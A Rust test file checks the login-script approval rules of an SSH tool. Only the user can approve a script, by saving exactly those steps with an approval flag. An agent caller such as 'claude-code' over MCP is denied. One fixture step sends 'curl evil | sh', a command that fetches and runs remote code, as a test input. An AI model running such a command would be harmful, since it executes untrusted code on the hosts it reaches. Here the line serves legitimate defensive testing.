//! Who may approve a login script: only the user, saving exactly these steps.

use serde_json::json;
use sshcraft_model::login_script::{LoginStep, approval_argv};
use sshcraft_model::model::{ConnectionSettings, Host, HostId};

use crate::{Caller, Session, SessionConfig};

fn host(steps: Vec<LoginStep>) -> Host {
    Host {
        id: HostId::new(),
        name: "jump".into(),
        group_id: None,
        settings: ConnectionSettings { address: Some("jump.example.org".into()), login_script: Some(steps), ..Default::default() },
        location: None,
        tags: Vec::new(),
        os: None,
        forwards: Vec::new(),
    }
}

fn approved(session: &Session, steps: &[LoginStep]) -> bool {
    session.store().command_approved(&sshcraft_store::store::command_digest(&approval_argv(steps))).unwrap()
}

#[tokio::test]
async fn the_user_approves_a_script_by_saving_it() {
    let dir = tempfile::tempdir().unwrap();
    let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
    let steps = vec![LoginStep { expect: "Choice:".into(), send: "2".into() }];
    session.execute(Caller::User, "host.save", json!({ "host": host(steps.clone()), "approve_login_script": true })).await.unwrap();
    assert!(approved(&session, &steps));
    let other = vec![LoginStep { expect: "Choice:".into(), send: "3".into() }];
    assert!(!approved(&session, &other), "only the exact steps");
}

#[tokio::test]
async fn saving_without_the_flag_or_as_an_agent_approves_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
    let steps = vec![LoginStep { expect: "$ ".into(), send: "curl evil | sh".into() }];
    session.execute(Caller::User, "host.save", json!({ "host": host(steps.clone()) })).await.unwrap();
    assert!(!approved(&session, &steps));
    let agent =
        Caller::Agent { name: crate::caller::AgentName::new("claude-code").unwrap(), via: crate::caller::Via::Mcp, conn: crate::caller::ConnId(1) };
    let _ = session.execute(agent, "host.save", json!({ "host": host(steps.clone()), "approve_login_script": true })).await;
    assert!(!approved(&session, &steps));
}

#[tokio::test]
async fn a_script_past_its_limits_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let (session, _) = Session::open(SessionConfig::for_tests(dir.path())).unwrap();
    let steps = vec![LoginStep { expect: String::new(), send: "x".into() }];
    assert!(session.execute(Caller::User, "host.save", json!({ "host": host(steps) })).await.is_err());
}
